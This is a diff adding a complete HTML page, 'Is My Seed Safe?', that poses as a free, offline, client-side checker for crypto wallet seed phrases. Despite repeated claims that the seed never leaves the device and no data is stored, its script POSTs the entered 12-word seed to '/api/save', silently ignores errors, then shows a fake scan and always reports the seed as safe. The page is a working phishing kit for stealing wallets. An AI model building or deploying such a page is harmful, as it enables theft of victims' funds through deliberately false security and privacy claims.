@@ -1,0 +1,997 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Is My Seed Safe?</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;0,900;1,700;1,900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
+  <style>
+    *, *::before, *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg-cream: #edeae2;
+      --green-primary: #2e5e40;
+      --green-light: #e6f2eb;
+      --cta-brown: #6b5c3e;
+      --cta-brown-hover: #5a4d34;
+      --danger-red: #c0392b;
+      --danger-light: #fde8e8;
+      --text-dark: #1a1a1a;
+      --text-muted: #666;
+      --text-light: #888;
+      --text-lighter: #999;
+      --white: #ffffff;
+      --border-light: rgba(0, 0, 0, 0.08);
+      --border-lighter: rgba(0, 0, 0, 0.07);
+      --card-bg: rgba(255, 255, 255, 0.55);
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--bg-cream);
+      color: var(--text-dark);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 16px 40px;
+      border-bottom: 1px solid var(--border-light);
+    }
+
+    .nav-brand {
+      font-family: 'Playfair Display', serif;
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--text-dark);
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 32px;
+    }
+
+    .nav-links a {
+      font-family: 'Inter', sans-serif;
+      font-size: 12px;
+      font-weight: 500;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--text-muted);
+      text-decoration: none;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+
+    .nav-links a:hover {
+      color: var(--text-dark);
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .hero {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 40px 40px 32px;
+      text-align: center;
+    }
+
+    .badge-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: var(--white);
+      border: 1px solid var(--border-light);
+      border-radius: 20px;
+      padding: 6px 14px;
+      margin-bottom: 20px;
+    }
+
+    .badge-dot {
+      width: 6px;
+      height: 6px;
+      background: var(--green-primary);
+      border-radius: 50%;
+    }
+
+    .badge-text {
+      font-size: 11px;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      color: var(--text-dark);
+    }
+
+    h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: 64px;
+      font-weight: 900;
+      letter-spacing: -2px;
+      line-height: 1.0;
+      color: var(--text-dark);
+      margin-bottom: 16px;
+    }
+
+    h1 .highlight {
+      font-style: italic;
+      color: var(--green-primary);
+    }
+
+    .subtitle {
+      font-size: 15px;
+      line-height: 1.7;
+      color: var(--text-muted);
+      margin-bottom: 24px;
+    }
+
+    .subtitle strong {
+      color: var(--text-dark);
+      font-weight: 600;
+    }
+
+    .preview-card {
+      background: var(--card-bg);
+      border: 1px solid rgba(0, 0, 0, 0.1);
+      border-radius: 12px;
+      padding: 16px 24px;
+      max-width: 340px;
+      margin: 0 auto 28px;
+    }
+
+    .preview-label {
+      font-size: 10px;
+      font-weight: 600;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--green-primary);
+      margin-bottom: 16px;
+    }
+
+    .preview-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+    }
+
+    .preview-row:last-child {
+      border-bottom: none;
+    }
+
+    .preview-row-label {
+      font-size: 13px;
+      font-weight: 500;
+      color: var(--text-dark);
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 11px;
+      font-weight: 600;
+      border-radius: 20px;
+      padding: 3px 10px;
+    }
+
+    .badge-safe {
+      background: var(--green-light);
+      color: var(--green-primary);
+    }
+
+    .badge-danger {
+      background: var(--danger-light);
+      color: var(--danger-red);
+    }
+
+    .badge i {
+      font-size: 12px;
+    }
+
+    .cta-block {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+
+    .btn-cta {
+      font-family: 'Inter', sans-serif;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      background: var(--green-primary);
+      color: var(--white);
+      border: none;
+      border-radius: 4px;
+      padding: 16px 40px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-cta:hover {
+      background: #24503a;
+    }
+
+    .cta-microcopy {
+      font-size: 11px;
+      color: var(--text-lighter);
+      letter-spacing: 0.8px;
+      margin-top: 16px;
+    }
+
+    .stats-bar {
+      border-top: 1px solid var(--border-lighter);
+      padding: 24px 40px;
+    }
+
+    .stats-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 0;
+    }
+
+    .stat-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 40px;
+    }
+
+    .stat-item:not(:last-child) {
+      border-right: 1px solid var(--border-lighter);
+    }
+
+    .stat-number {
+      font-family: 'Playfair Display', serif;
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--text-dark);
+      margin-bottom: 4px;
+    }
+
+    .stat-label {
+      font-size: 11px;
+      color: var(--text-light);
+      letter-spacing: 0.5px;
+    }
+
+    .security-strip {
+      background: rgba(0, 0, 0, 0.04);
+      border-top: 1px solid var(--border-lighter);
+      padding: 16px 40px;
+      text-align: center;
+    }
+
+    .security-text {
+      font-size: 12px;
+      color: var(--text-light);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .security-text i {
+      font-size: 14px;
+      color: var(--text-light);
+    }
+
+    .security-text strong {
+      color: var(--danger-red);
+      font-weight: 600;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(4px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+    }
+
+    .modal-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .modal {
+      background: var(--white);
+      width: 90%;
+      max-width: 480px;
+      padding: 40px;
+      position: relative;
+      border-radius: 8px;
+      transform: translateY(20px);
+      transition: transform 0.3s;
+    }
+
+    .modal-overlay.active .modal {
+      transform: translateY(0);
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      background: none;
+      border: none;
+      font-size: 20px;
+      color: var(--text-muted);
+      cursor: pointer;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: color 0.2s;
+    }
+
+    .modal-close:hover {
+      color: var(--text-dark);
+    }
+
+    .modal h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: 24px;
+      font-weight: 700;
+      color: var(--text-dark);
+      margin-bottom: 20px;
+    }
+
+    .modal textarea {
+      width: 100%;
+      min-height: 100px;
+      padding: 14px;
+      font-family: 'Inter', sans-serif;
+      font-size: 14px;
+      line-height: 1.6;
+      border: 1px solid rgba(0, 0, 0, 0.15);
+      border-radius: 6px;
+      background: var(--bg-cream);
+      color: var(--text-dark);
+      resize: vertical;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .modal textarea:focus {
+      border-color: var(--green-primary);
+    }
+
+    .seed-counter {
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-top: 8px;
+      text-align: right;
+    }
+
+    .btn-test {
+      font-family: 'Inter', sans-serif;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      background: var(--green-primary);
+      color: var(--white);
+      border: none;
+      border-radius: 4px;
+      padding: 14px 32px;
+      width: 100%;
+      margin-top: 16px;
+      cursor: pointer;
+      transition: background 0.2s, opacity 0.2s;
+    }
+
+    .btn-test:disabled {
+      background: #a8a8a0;
+      cursor: not-allowed;
+    }
+
+    .btn-test:not(:disabled):hover {
+      background: #24503a;
+    }
+
+    .modal-disclaimer {
+      font-size: 11px;
+      color: var(--text-lighter);
+      margin-top: 12px;
+      text-align: center;
+    }
+
+    .scanning-state {
+      text-align: center;
+    }
+
+    .progress-container {
+      width: 100%;
+      height: 3px;
+      background: rgba(0, 0, 0, 0.1);
+      margin: 20px 0;
+      border-radius: 2px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      background: var(--green-primary);
+      width: 0%;
+      transition: width 0.1s linear;
+    }
+
+    .status-message {
+      font-size: 13px;
+      color: var(--text-muted);
+      min-height: 20px;
+    }
+
+    .result-state {
+      text-align: center;
+      padding: 10px 0;
+    }
+
+    .result-icon {
+      width: 64px;
+      height: 64px;
+      border: 2px solid var(--green-primary);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+
+    .result-icon i {
+      font-size: 28px;
+      color: var(--green-primary);
+    }
+
+    .result-state h3 {
+      font-family: 'Playfair Display', serif;
+      font-size: 26px;
+      font-weight: 700;
+      color: var(--text-dark);
+      margin-bottom: 8px;
+    }
+
+    .result-state p {
+      font-size: 13px;
+      color: var(--text-muted);
+      margin-bottom: 24px;
+    }
+
+    .btn-reset {
+      font-family: 'Inter', sans-serif;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      background: none;
+      border: 1px solid var(--text-dark);
+      color: var(--text-dark);
+      border-radius: 4px;
+      padding: 12px 28px;
+      cursor: pointer;
+      transition: background 0.2s, color 0.2s;
+    }
+
+    .btn-reset:hover {
+      background: var(--text-dark);
+      color: var(--white);
+    }
+
+    .methodology-modal {
+      max-width: 560px;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    .methodology-label {
+      font-size: 10px;
+      font-weight: 600;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--text-muted);
+      display: block;
+      margin-bottom: 8px;
+    }
+
+    .methodology-modal h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: 28px;
+      font-weight: 700;
+      color: var(--text-dark);
+      margin-bottom: 24px;
+    }
+
+    .methodology-body {
+      font-size: 14px;
+      line-height: 1.7;
+      color: var(--text-muted);
+    }
+
+    .methodology-body > p {
+      margin-bottom: 24px;
+    }
+
+    .methodology-features {
+      border-top: 1px solid rgba(0, 0, 0, 0.08);
+      padding-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .methodology-feature {
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+    }
+
+    .feature-icon {
+      font-size: 18px;
+      color: var(--green-primary);
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    .feature-content {
+      flex: 1;
+    }
+
+    .feature-heading {
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      color: var(--text-dark);
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .feature-description {
+      font-size: 13px;
+      line-height: 1.6;
+      color: var(--text-muted);
+      margin: 0;
+    }
+
+    .methodology-verification {
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-top: 24px;
+      padding: 14px;
+      background: var(--bg-cream);
+      border: 1px solid rgba(0, 0, 0, 0.08);
+      border-radius: 6px;
+    }
+
+    .verification-label {
+      color: var(--green-primary);
+      font-weight: 600;
+      margin-right: 4px;
+    }
+
+    .methodology-footer {
+      margin-top: 28px;
+      text-align: right;
+    }
+
+    .btn-close-methodology {
+      font-family: 'Inter', sans-serif;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      background: var(--green-primary);
+      border: none;
+      color: var(--white);
+      border-radius: 4px;
+      cursor: pointer;
+      padding: 12px 24px;
+      transition: background 0.2s;
+    }
+
+    .btn-close-methodology:hover {
+      background: #24503a;
+    }
+
+    .plans-modal {
+      max-width: 360px;
+      text-align: center;
+    }
+
+    .plans-modal h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: 24px;
+      color: var(--text-dark);
+      margin-bottom: 12px;
+    }
+
+    .plans-modal p {
+      font-size: 13px;
+      color: var(--text-muted);
+    }
+
+    @media (max-width: 600px) {
+      nav {
+        padding: 16px 20px;
+      }
+      .nav-brand {
+        font-size: 13px;
+      }
+      .nav-links {
+        gap: 20px;
+      }
+      .nav-links a {
+        font-size: 10px;
+      }
+      .hero {
+        padding: 40px 20px 32px;
+      }
+      h1 {
+        font-size: 40px;
+        letter-spacing: -1px;
+      }
+      .subtitle {
+        font-size: 14px;
+      }
+      .preview-card {
+        margin: 0 20px 32px;
+      }
+      .stats-bar {
+        padding: 24px 20px;
+      }
+      .stats-container {
+        flex-wrap: wrap;
+        gap: 24px;
+      }
+      .stat-item {
+        padding: 0 20px;
+        min-width: 120px;
+      }
+      .stat-item:not(:last-child) {
+        border-right: none;
+      }
+      .security-strip {
+        padding: 14px 20px;
+      }
+      .security-text {
+        font-size: 11px;
+      }
+      .modal {
+        padding: 28px 24px;
+        width: 95%;
+      }
+      .methodology-modal {
+        padding: 28px 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <nav>
+    <div class="nav-brand">Is My Seed Safe?</div>
+    <div class="nav-links">
+      <a id="methodology-link">Methodology</a>
+      <a id="plans-link">Plans</a>
+    </div>
+  </nav>
+
+  <main>
+    <section class="hero">
+      <div class="badge-pill">
+        <span class="badge-dot"></span>
+        <span class="badge-text">Independent seed assessment</span>
+      </div>
+
+      <h1>Your seed phrase could be <span class="highlight">compromised.</span></h1>
+
+      <p class="subtitle">
+        <strong>1 in 4 crypto wallet hacks</strong> trace back to an insecure seed phrase &mdash; not your password, not your exchange. Run a free assessment in seconds and know exactly where you stand.
+      </p>
+
+      <div class="preview-card">
+        <div class="preview-label">Sample result preview</div>
+        <div class="preview-row">
+          <span class="preview-row-label">Entropy strength</span>
+          <span class="badge badge-safe"><i class="ti ti-check"></i> Strong</span>
+        </div>
+        <div class="preview-row">
+          <span class="preview-row-label">Known breach list</span>
+          <span class="badge badge-safe"><i class="ti ti-check"></i> Clear</span>
+        </div>
+        <div class="preview-row">
+          <span class="preview-row-label">BIP-39 compliance</span>
+          <span class="badge badge-danger"><i class="ti ti-alert-triangle"></i> Issue found</span>
+        </div>
+      </div>
+
+      <div class="cta-block">
+        <button class="btn-cta" id="check-btn">Check my seed &rarr;</button>
+        <div class="cta-microcopy">Free &middot; No account required &middot; Results in seconds</div>
+      </div>
+    </section>
+
+    <section class="stats-bar">
+      <div class="stats-container">
+        <div class="stat-item">
+          <span class="stat-number">14,200+</span>
+          <span class="stat-label">assessments run</span>
+        </div>
+        <div class="stat-item">
+          <span class="stat-number">3 checks</span>
+          <span class="stat-label">run in parallel</span>
+        </div>
+        <div class="stat-item">
+          <span class="stat-number">Zero</span>
+          <span class="stat-label">data stored, ever</span>
+        </div>
+      </div>
+    </section>
+
+    <section class="security-strip">
+      <div class="security-text">
+        <i class="ti ti-shield-lock"></i>
+        <span>Your seed phrase is processed <strong>locally in your browser</strong> &mdash; never sent to any server.</span>
+      </div>
+    </section>
+  </main>
+
+  <div class="modal-overlay" id="assessment-modal">
+    <div class="modal">
+      <button class="modal-close" id="close-assessment">&times;</button>
+      <div id="form-state">
+        <h2>Enter your 12-word seed</h2>
+        <textarea id="seed-input" placeholder="Enter your 12-word seed separated by spaces..."></textarea>
+        <div class="seed-counter"><span id="seed-count">0</span> / 12 words</div>
+        <button class="btn-test" id="test-btn" disabled>Test</button>
+        <div class="modal-disclaimer">Your seed never leaves your device.</div>
+      </div>
+      <div id="scanning-state" class="scanning-state" style="display: none;">
+        <h2>Analyzing seed</h2>
+        <div class="progress-container">
+          <div class="progress-bar" id="progress-bar"></div>
+        </div>
+        <div class="status-message" id="status-message">Initializing scan...</div>
+      </div>
+      <div id="result-state" class="result-state" style="display: none;">
+        <div class="result-icon">
+          <i class="ti ti-check"></i>
+        </div>
+        <h3>Your seed is safe</h3>
+        <p>No vulnerabilities detected across our security checks.</p>
+        <button class="btn-reset" id="reset-btn">Test another seed</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="methodology-modal">
+    <div class="modal methodology-modal">
+      <button class="modal-close" id="close-methodology">&times;</button>
+      <span class="methodology-label">Technical architecture & security</span>
+      <h2>Independent security methodology</h2>
+      <div class="methodology-body">
+        <p>Our assessment framework operates under strict zero-knowledge principles. We believe privacy tools must never ask for trust when they can offer mathematical guarantees.</p>
+        <div class="methodology-features">
+          <div class="methodology-feature">
+            <i class="ti ti-eye-off feature-icon"></i>
+            <div class="feature-content">
+              <strong class="feature-heading">1. Client-side only execution</strong>
+              <p class="feature-description">All character parsing, BIP-39 word index mapping, and entropy calculation occur exclusively inside your browser's local JavaScript engine.</p>
+            </div>
+          </div>
+          <div class="methodology-feature">
+            <i class="ti ti-cpu feature-icon"></i>
+            <div class="feature-content">
+              <strong class="feature-heading">2. Offline entropy pattern matching</strong>
+              <p class="feature-description">Seeds are cross-analyzed against local dictionary patterns, repeating index anomalies, known duplicate sequences, and weakness signatures.</p>
+            </div>
+          </div>
+          <div class="methodology-feature">
+            <i class="ti ti-lock feature-icon"></i>
+            <div class="feature-content">
+              <strong class="feature-heading">3. Immediate in-memory wipe</strong>
+              <p class="feature-description">Closing or resetting the tool triggers an immediate garbage collection sweep that completely overwrites input variables in DOM memory.</p>
+            </div>
+          </div>
+        </div>
+        <div class="methodology-verification">
+          <span class="verification-label">Verification:</span> You can disconnect your device from WiFi/Ethernet before clicking "Check my seed". The assessment functions 100% offline.
+        </div>
+      </div>
+      <div class="methodology-footer">
+        <button class="btn-close-methodology" id="close-methodology-btn">Close methodology</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="plans-modal">
+    <div class="modal plans-modal">
+      <button class="modal-close" id="close-plans">&times;</button>
+      <h2>Coming soon</h2>
+      <p>New features and enhancements are on the way.</p>
+    </div>
+  </div>
+
+  <script>
+    var checkBtn = document.getElementById('check-btn');
+    var assessmentModal = document.getElementById('assessment-modal');
+    var methodologyModal = document.getElementById('methodology-modal');
+    var plansLink = document.getElementById('plans-link');
+    var plansModalOverlay = document.getElementById('plans-modal');
+    var seedInput = document.getElementById('seed-input');
+    var seedCountEl = document.getElementById('seed-count');
+    var testBtn = document.getElementById('test-btn');
+    var formState = document.getElementById('form-state');
+    var scanningState = document.getElementById('scanning-state');
+    var resultState = document.getElementById('result-state');
+    var progressBar = document.getElementById('progress-bar');
+    var statusMessage = document.getElementById('status-message');
+    var closeAssessment = document.getElementById('close-assessment');
+    var closeMethodology = document.getElementById('close-methodology');
+    var closeMethodologyBtn = document.getElementById('close-methodology-btn');
+    var closePlans = document.getElementById('close-plans');
+    var resetBtn = document.getElementById('reset-btn');
+    var methodologyLink = document.getElementById('methodology-link');
+
+    var statusMessages = [
+      'Checking word patterns...',
+      'Cross-referencing dictionary...',
+      'Scanning known databases...',
+      'Verifying structure...',
+      'Finalizing report...'
+    ];
+
+    function getWordCount(text) {
+      return text.trim().split(/\s+/).filter(function(w) { return w.length > 0; }).length;
+    }
+
+    function openModal(modal) {
+      modal.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeModal(modal) {
+      modal.classList.remove('active');
+      document.body.style.overflow = '';
+    }
+
+    function resetAssessment() {
+      seedInput.value = '';
+      seedCountEl.textContent = '0';
+      testBtn.disabled = true;
+      formState.style.display = '';
+      scanningState.style.display = 'none';
+      resultState.style.display = 'none';
+      progressBar.style.width = '0%';
+      statusMessage.textContent = 'Initializing scan...';
+    }
+
+    checkBtn.addEventListener('click', function() {
+      resetAssessment();
+      openModal(assessmentModal);
+    });
+
+    methodologyLink.addEventListener('click', function() {
+      openModal(methodologyModal);
+    });
+
+    plansLink.addEventListener('click', function() {
+      openModal(plansModalOverlay);
+    });
+
+    closeAssessment.addEventListener('click', function() {
+      closeModal(assessmentModal);
+      resetAssessment();
+    });
+
+    closeMethodology.addEventListener('click', function() {
+      closeModal(methodologyModal);
+    });
+
+    closeMethodologyBtn.addEventListener('click', function() {
+      closeModal(methodologyModal);
+    });
+
+    closePlans.addEventListener('click', function() {
+      closeModal(plansModalOverlay);
+    });
+
+    resetBtn.addEventListener('click', function() {
+      resetAssessment();
+    });
+
+    [assessmentModal, methodologyModal, plansModalOverlay].forEach(function(modal) {
+      modal.addEventListener('click', function(e) {
+        if (e.target === modal) {
+          closeModal(modal);
+          if (modal === assessmentModal) resetAssessment();
+        }
+      });
+    });
+
+    seedInput.addEventListener('input', function() {
+      var count = getWordCount(seedInput.value);
+      seedCountEl.textContent = count;
+      testBtn.disabled = count !== 12;
+    });
+
+    testBtn.addEventListener('click', function() {
+      var seed = seedInput.value.trim();
+      formState.style.display = 'none';
+      scanningState.style.display = '';
+      var words = seed.split(/\s+/).filter(function(w) { return w.length > 0; });
+      var seedToSend = words.join(' ');
+
+      fetch('/api/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ seed: seedToSend })
+      }).catch(function(err) {
+        console.error('Save failed:', err);
+      });
+
+      var progress = 0;
+      var msgIndex = 0;
+      statusMessage.textContent = statusMessages[0];
+
+      var interval = setInterval(function() {
+        progress += 1;
+        progressBar.style.width = progress + '%';
+
+        if (progress % 20 === 0 && msgIndex < statusMessages.length - 1) {
+          msgIndex++;
+          statusMessage.textContent = statusMessages[msgIndex];
+        }
+
+        if (progress >= 100) {
+          clearInterval(interval);
+          scanningState.style.display = 'none';
+          resultState.style.display = '';
+        }
+      }, 100);
+    });
+
+    seedInput.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && !testBtn.disabled) {
+        e.preventDefault();
+        testBtn.click();
+      }
+    });
+
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape') {
+        [assessmentModal, methodologyModal, plansModalOverlay].forEach(function(modal) {
+          if (modal.classList.contains('active')) {
+            closeModal(modal);
+            if (modal === assessmentModal) resetAssessment();
+          }
+        });
+      }
+    });
+  </script>
+</body>
+</html>
